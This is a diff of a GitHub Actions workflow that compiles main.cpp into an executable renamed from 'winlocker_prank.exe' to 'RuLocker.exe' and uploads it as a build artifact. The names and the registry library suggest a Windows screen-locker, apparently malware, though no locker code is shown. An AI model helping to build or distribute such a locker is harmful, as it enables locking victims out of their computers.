@@ -1,4 +1,4 @@
-name: Build WinLocker C++
+name: Build RuLocker
 
 on:
   push:
@@ -7,7 +7,7 @@ on:
     branches: [ main ]
 
 jobs:
-  build-winlocker:
+  build-locker:
     runs-on: windows-latest
 
     steps:
@@ -18,14 +18,14 @@ jobs:
 
     - name: Build EXE
       shell: cmd
-      # Фикс: добавлена advapi32.lib для работы с реестром
+      # Добавлен флаг /utf-8 для корректной компиляции русских строк
       run: |
-        cl /EHsc main.cpp /link user32.lib gdi32.lib comctl32.lib advapi32.lib /OUT:winlocker_prank.exe
+        cl /EHsc /utf-8 main.cpp /link user32.lib gdi32.lib comctl32.lib advapi32.lib gdiplus.lib /OUT:RuLocker.exe
         if %errorlevel% neq 0 exit /b %errorlevel%
 
-    - name: Upload EXE artifact
+    - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: winlocker-exe
-        path: winlocker_prank.exe
+        name: RuLocker
+        path: RuLocker.exe
         retention-days: 30
